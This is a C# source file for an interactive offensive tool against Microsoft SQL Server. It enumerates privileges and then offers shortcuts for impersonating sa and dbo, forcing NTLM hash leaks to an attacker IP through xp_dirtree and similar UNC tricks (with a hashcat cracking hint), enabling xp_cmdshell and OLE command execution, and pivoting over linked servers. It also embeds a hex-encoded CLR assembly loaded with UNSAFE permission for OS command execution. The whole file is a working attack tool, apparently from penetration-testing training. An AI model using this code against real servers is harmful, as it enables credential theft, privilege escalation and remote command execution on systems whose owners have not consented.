using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;

namespace SqlShell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if ((int)args.Length == 1)
            {
                string target_server = args[0];
                string str1 = "master";
                SqlConnection sqlConnection = new SqlConnection(string.Concat(new string[] { "Server = ", target_server, "; Database = ", str1, "; Integrated Security = True;" }));
                Console.WriteLine("Connecting to " + target_server);
                try
                {
                    sqlConnection.Open();
                    Console.WriteLine("Auth success!");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                //intro enum
                Console.WriteLine("Logged in as:");
                string command = "select SYSTEM_USER";
                RunQuery(command, sqlConnection);

                Console.WriteLine("The following will output '1' if the logged in user is a member of the public role");
                command = "select IS_SRVROLEMEMBER('public')";
                RunQuery(command, sqlConnection);

                Console.WriteLine("The following will output '1' if the logged in user is a member of the sysadmin role");
                command = "select IS_SRVROLEMEMBER('sysadmin')";
                RunQuery(command, sqlConnection);

                Console.WriteLine("You don't know which account but some account can impersonate the following principals:");
                command = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";
                RunQuery(command, sqlConnection);

                Console.WriteLine("Running as the following (system_user, current_user, session_user):");
                command = "select system_user as systemuser, current_user as currentuser, session_user as sessionuser;";
                RunQuery(command, sqlConnection);



                command = "";
                while (true)
                {
                    Console.WriteLine("Enter SQL Query or Command:");
                    command = Console.ReadLine();
                    if (command.ToLower() == "exit")
                    {
                        break;
                    }
                    //impersonation
                    if (command.ToLower() == "impersonatesa")
                    {
                        command = "execute as login ='sa';";
                        RunQuery(command, sqlConnection);
                    }
                    else if (command.ToLower() == "impersonatedbo")
                    {
                        command = "use msdb; execute as user = 'dbo';";
                        RunQuery(command, sqlConnection);
                    }
                    //unc hash theft
                    else if (command.ToLower().StartsWith("dirtree "))
                    {
                        command = "exec master..xp_dirtree \"\\\\" + command.Substring(8) + "\\\\test\";";
                        RunQuery(command, sqlConnection);
                        Console.WriteLine("Hashcat command for cracking is: hashcat -m 5600 hash.txt dict.txt --force");
                    }
                    else if (command.ToLower().StartsWith("fileexist "))
                    {
                        command = "exec master..xp_fileexist \"\\\\" + command.Substring(10) + "\\\\test\";";
                        RunQuery(command, sqlConnection);
                        Console.WriteLine("Hashcat command for cracking is: hashcat -m 5600 hash.txt dict.txt --force");
                    }
                    else if (command.ToLower().StartsWith("backup "))
                    {
                        command = "backup log [testing] to disk \"\\\\" + command.Substring(7) + "\\\\test\";";
                        RunQuery(command, sqlConnection);
                        Console.WriteLine("Hashcat command for cracking is: hashcat -m 5600 hash.txt dict.txt --force");
                    }
                    else if (command.ToLower().StartsWith("restore "))
                    {
                        command = "restore log [testing] from disk \"\\\\" + command.Substring(8) + "\\\\test\";";
                        RunQuery(command, sqlConnection);
                        Console.WriteLine("Hashcat command for cracking is: hashcat -m 5600 hash.txt dict.txt --force");
                    }
                    else if (command.ToLower().StartsWith("assemblyunc "))
                    {
                        command = "create assembly helloworld from \"\\\\" + command.Substring(12) + "\\\\test\" with permission_set = safe;";
                        RunQuery(command, sqlConnection);
                        Console.WriteLine("Hashcat command for cracking is: hashcat -m 5600 hash.txt dict.txt --force");
                    }
                    else if (command.ToLower().StartsWith("extendedsproc "))
                    {
                        command = "sp_addextendedproc 'xp_hello',\"\\\\" + command.Substring(14) + "\\\\test\";";
                        RunQuery(command, sqlConnection);
                        Console.WriteLine("Hashcat command for cracking is: hashcat -m 5600 hash.txt dict.txt --force");
                    }
                    //xp_cmdshell
                    else if (command.ToLower() == "enable_xp_cmdshell")
                    {
                        command = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                        RunQuery(command, sqlConnection);
                    }
                    else if (command.ToLower().StartsWith("shell "))
                    {
                        command = string.Concat("EXEC xp_cmdshell ", command.Substring(6));
                        RunQuery(command, sqlConnection);
                    }
                    //ole shell
                    else if (command.ToLower() == "enable_ole")
                    {
                        command = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                        RunQuery(command, sqlConnection);
                    }
                    else if (command.StartsWith("oleshell "))
                    {
                        string str3 = command.ToLower().Replace("oleshell ", "");
                        command = string.Concat("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"", str3, "\"';");
                        RunQuery(command, sqlConnection);
                    }
                    //assembly shell
                    else if (command.ToLower() == "enable_assembly_shell")
                    {
                        string command1 = "use msdb;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
                        string command2 = "DROP PROCEDURE IF EXISTS [dbo].[cmdExec];DROP ASSEMBLY IF EXISTS my_assembly;";
                        string command3 = "CREATE ASSEMBLY my_assembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300F2A4D3C10000000000000000E00022200B013000000C00000006000000000000F22A00000020000000400000000000100020000000020000040000000000000006000000000000000080000000020000000000000300608500001000001000000000100000100000000000001000000000000000000000009D2A00004F000000004000006803000000000000000000000000000000000000006000000C000000002A0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F80A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000D12A000000000000480000000200050028210000D8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600C00000000100001100731000000A0A066F1100000A72010000706F1200000A00066F1100000A7239000070028C12000001281300000A6F1400000A00066F1100000A166F1500000A00066F1100000A176F1600000A00066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A000716066F1C00000A6F1D00000A6F1E00000A6F1F00000A00281A00000A076F2000000A00281A00000A6F2100000A00066F2200000A00066F2300000A002A2202282400000A002A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000FC03000023537472696E67730000000020070000580000002355530078070000100000002347554944000000880700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F00000001000000010000000300000000006C02010000000000060096011B03060003021B030600B400E9020F003B0300000600DC007F02060079017F0206005A017F020600EA017F020600B6017F020600CF017F02060009017F020600C800FC020600A600FC0206003D017F0206002401350206008D0378020A00F300C8020A004F024A030E007003E9020A006A00C8020E009F02E9020600650278020A002000C8020A00960014000A00DF03C8020A008E00C8020600B0020A000600BD020A000000000001000000000001000100010010005F03000041000100010050200000000096003500620001001C21000000008618E30206000200000001005E000900E30201001100E30206001900E3020A002900E30210003100E30210003900E30210004100E30210004900E30210005100E30210005900E30210006100E30215006900E30210007100E30210007900E30210008900E30206009900E3020600990091022100A90078001000B10086032600A90078031000A90021021500A900C40315009900AB032C00B900E3023000A100E3023800C90085003F00D100A00344009900B1034A00E10045004F00810059024F00A10062025300D100EA034400D1004F0006009900940306009900A00006008100E302060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003D00000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007802000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D644578656300636D64657865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700636D64657865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000007C01E16C7BEFCF43AB1C94C99F7A0E2B00042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000701000000000C010007636D6465786563000005010000000017010012436F7079726967687420C2A920203230323300002901002439666434326166352D666630362D343266312D396531612D34633330376561333030306600000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E320401000000000000000000214FDFD8000000000200000065000000382A0000380C00000000000000000000000000001000000000000000000000000000000052534453F26FF5A443A1D341B978AF9E2CC1642901000000433A5C55736572735C6F66667365632E434F5250312E3030305C736F757263655C7265706F735C636D64657865635C636D64657865635C6F626A5C44656275675C636D64657865632E70646200C52A00000000000000000000DF2A0000002000000000000000000000000000000000000000000000D12A0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000000000FF2500200010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E000000000063006D00640065007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006D00640065007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200330000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D00640065007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D0065000000000063006D00640065007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000F43A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;";
                        string command4 = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];";
                        RunQuery(command1, sqlConnection);
                        RunQuery(command2, sqlConnection);
                        RunQuery(command3, sqlConnection);
                        RunQuery(command4, sqlConnection);
                    }
                    else if (command.StartsWith("assemblyshell "))
                    {
                        string str8 = command.ToLower().Replace("assemblyshell ", "");
                        command = string.Concat("EXEC cmdExec '", str8, "';");
                        RunQuery(command, sqlConnection);
                    }
                    //view links
                    else if (command.ToLower() == "viewlinks")
                    {
                        command = "exec sp_linkedservers";
                        RunQuery(command, sqlConnection);
                        command = "select srvname from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server'";
                        RunQuery(command, sqlConnection);
                    }
                    else if (command.ToLower().StartsWith("testopenquery "))
                    {
                        command = "select version from openquery(\"" + command.Substring(14) + "\",'select @@version as version')";
                        RunQuery(command, sqlConnection);
                        command = "select mylogin from openquery(\""+command.Substring(14)+"\", 'select SYSTEM_USER as mylogin')";
                        RunQuery(command, sqlConnection);
                    }
                    else if (command.ToLower().StartsWith("testat "))
                    {
                        command = "EXEC ('select @@version') AT [" + command.Substring(7)+"];";
                        RunQuery(command, sqlConnection);
                    }
                    else if (command.ToLower().StartsWith("enableat "))
                    {
                        command = "EXEC sp_serveroption '" + command.Substring(9) + "', 'rpc out', 'true';";
                    }
                    //help
                    else if (command.ToLower() == "help")
                    {
                        Console.WriteLine("Just type the query and hit enter for any query. Shortcut commands below.");
                        Console.WriteLine("Impersonation:");
                        Console.WriteLine("    impersonatesa");
                        Console.WriteLine("    impersonatedbo");
                        Console.WriteLine("Hash stealing:");
                        Console.WriteLine("    Executable by public role:");
                        Console.WriteLine("        dirtree: eg dirtree 192.168.45.190");
                        Console.WriteLine("        fileexist: eg fileexist 192.168.45.190");
                        Console.WriteLine("        backup: eg backup 192.168.45.190");
                        Console.WriteLine("        restore: eg restore 192.168.45.190");
                        Console.WriteLine("    Executable by sysadmin role:");
                        Console.WriteLine("        assemblyunc: eg assemblyunc 192.168.45.190");
                        Console.WriteLine("        extendedsproc: eg extendedsproc 192.168.45.190");
                        Console.WriteLine("Commmand Exec");
                        Console.WriteLine("    XP_CMDSHELL:");
                        Console.WriteLine("        enable_xp_cmdshell - enable it if you can.");
                        Console.WriteLine("        shell <oscommand> - run an xp_cmdshell command if you can.");
                        Console.WriteLine("    OLE:");
                        Console.WriteLine("        enable_ole - enable it if you can.");
                        Console.WriteLine("        olecommand <oscommand> - run a command with it if you can.");
                        Console.WriteLine("    Assembly Shell:");
                        Console.WriteLine("        enable_assembly_shell - enable it if you can.");
                        Console.WriteLine("        assemblyshell <oscommand> - run a command with it if you can.");
                        Console.WriteLine("Linked Servers");
                        Console.WriteLine("    viewlinks - runs two queries to check for links");
                        Console.WriteLine("    testopenquery <hostname> - tests openquery remote execution - outputs remote version if it works.");
                        Console.WriteLine("    testat <hostname> - tests remote execution with AT - outputs remote version if it works.");
                        Console.WriteLine("    enableat <hostname> - enables rpc out to the selected hostname to allow for AT commands to it.");
                        Console.WriteLine("    ");
                    }
                    else
                    {
                        RunQuery(command, sqlConnection);
                    }
                }

                sqlConnection.Close();
            }
            else
            {
                Console.WriteLine("Need one arg of the fqdn of target eg dc01.corp.com");
            }
        }
        public static void RunQuery(string command, SqlConnection sqlConnection)
        {
            try
            {
                SqlDataReader sqlDataReader = (new SqlCommand(command, sqlConnection)).ExecuteReader();
                Console.WriteLine("Printing Results:");
                while (sqlDataReader.Read())
                {
                    List<string> strs = new List<string>();
                    for (int i = 0; i < sqlDataReader.FieldCount; i++)
                    {
                        strs.Add(sqlDataReader[i].ToString());
                    }
                    Console.WriteLine(string.Join(",", strs.ToArray()));
                }
                sqlDataReader.Close();
            }
            catch (Exception exception)
            {
                Console.WriteLine(exception.Message);
            }
        }
    }


}

